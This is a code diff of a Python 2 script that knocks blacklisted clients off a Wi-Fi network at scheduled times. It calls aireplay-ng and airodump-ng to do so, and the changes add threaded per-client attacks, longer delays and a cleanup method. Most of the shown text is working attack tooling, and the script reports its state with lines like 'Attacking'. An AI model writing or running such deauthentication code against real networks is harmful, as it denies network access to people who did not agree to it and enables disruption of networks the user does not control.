@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #
-# Deauthenticates Clients From A Network (Setting Up a Bed Time. The Hard Way)
+# Deauthenticates Clients From A Network 
 #
 import os
 import csv
@@ -25,7 +25,7 @@ class Engine(object):
   self.csv   = desti
   self.alive = False
   self.delay = False
-  self.dely  = 60 if mode == 'S' else 30
+  self.dely  = 180 if mode == 'S' else 60
   self.n_s_h = '0{}'.format(self.s_hr) if len(str(self.s_hr))<2 else self.s_hr
   self.n_e_h = '0{}'.format(self.e_hr) if len(str(self.s_hr))<2 else self.e_hr
   self.n_s_m = '0{}'.format(self.s_min) if len(str(self.s_min))<2 else self.s_min
@@ -85,6 +85,14 @@ class Engine(object):
  def clean(self):
   list=(item for item in os.listdir('.') if item.endswith('.csv')) 
   for item in list:os.remove(item)  
+
+ def kill(self):
+  self.state=False
+  self.alive=False
+  self.delay=False
+  Popen(['pkill','airodump-ng']).wait()
+  Popen(['pkill','aireplay-ng']).wait()
+  for i in range(2):self.managed();self.clean()
 
 def from_file_to_list(file):
  list=[]
@@ -152,11 +160,14 @@ def main():
   while engine.delay:
    n=engine.now()
    hrs,mins=n[0],n[1]
-   if not int(hrs) in mem[0] and not int(mins) in mem[1]:
-    mem[0].append(int(hrs));mem[1].append(int(mins))  
+
+   if not int(mins) in mem[1]:
+    mem[0].append(int(hrs));mem[1].append(int(mins)) 
+ 
    for a,alpha in enumerate(mem[0]):
     for b,beta in enumerate(mem[1]):
      if a!=b:continue
+
      if alpha == engine.e_hr and beta == engine.e_min:
       engine.state=False
       engine.alive=False
@@ -165,12 +176,18 @@ def main():
  # Start Proc
  while 1:
   try:
-   engine.state=engine.status(engine.now())
-   if engine.state==None:msg=True if engine.alive else False
-   if engine.state:
+   # Mode Changer
+   engine.state=engine.status(engine.now()) 
+
+   # When It's Not Off Or On
+   if engine.state==None:msg=True if engine.alive else False 
+
+   # When It's On; Display
+   if engine.state:  
     call(['clear'])
     print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,engine.n_e_h,engine.n_e_m)
-    
+   
+   #  When It's Off; Display
    elif engine.state==False:
     call(['clear'])
     engine.state=False
@@ -179,7 +196,10 @@ def main():
     Popen(['pkill','airodump-ng']).wait()
     print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,engine.n_s_h,engine.n_s_m)
     
+   # When It's Not Off Or On
    else:
+
+    # Messages To Display; It Depends On If It's Off Or Neutral
     if engine.alive:
      call(['clear'])
      print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(msg,engine.n_e_h,engine.n_e_m)
@@ -187,33 +207,59 @@ def main():
     else:
      call(['clear'])
      print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,engine.n_s_h,engine.n_s_m)
-     
+   
+   # When It's On; Do This  
    if engine.state:
     if not engine.alive:
      engine.alive=True 
      del mem[0][:];del mem[1][:] 
 
+   # When It's Off; Do This
    if engine.state==False:
     if engine.alive:Popen(['pkill','airodump-ng']).wait();engine.alive=False
 
+   # Attack Function
+   def attack(client):
+    for n in range(3):
+     engine.attack(client)
+     time.sleep(25)
+
+   # When Alive; Do This
    if engine.alive:
     engine.delay=True
     Thread(target=check).start()
     updates()
     engine.scan()
-    for i,client in enumerate(blist):
-     if i!=len(blist)-1:
-      for n in range(3):engine.attack(client);time.sleep(25)
-    time.sleep(engine.dely) 
+    
+    # Disconnect Clients From The Blacklist
+    for client in blist:
+     bot=Thread(target=attack,args=[client])
+     bot.start()
+
+    # Did We Disconnect Clients? If Yes, Then Wait, There Still Might Be Client Being Disconnecting
+    if len(blist):
+     while bot.is_alive() and engine.alive:pass
+
+    # Smart Delay; 
+    for k in range(engine.dely):
+     if engine.alive:time.sleep(1) 
+     else:break
+    
+    # Kills The Time Keeping Thread
     engine.delay=False
-   time.sleep(.5)     
-   del mem[0][:];del mem[1][:]         
+ 
+   # Try & Reduce Fli
+   time.sleep(.4)  
+
+   # Flush List That Holds Time 
+   del mem[0][:];del mem[1][:]  
+       
   except KeyboardInterrupt:
-   call(['clear'])
-   engine.delay=False
-   Popen(['pkill','airodump-ng']).wait()
-   Popen(['pkill','aireplay-ng']).wait()
-   for i in range(2):engine.managed();engine.clean()
+   call(['clear']) 
+   kill=Thread(target=engine.kill);kill.start()
+   print '[-] Exiting ...'
+   while kill.is_alive():pass
+   break
 
 if __name__ == '__main__':
  # Filters
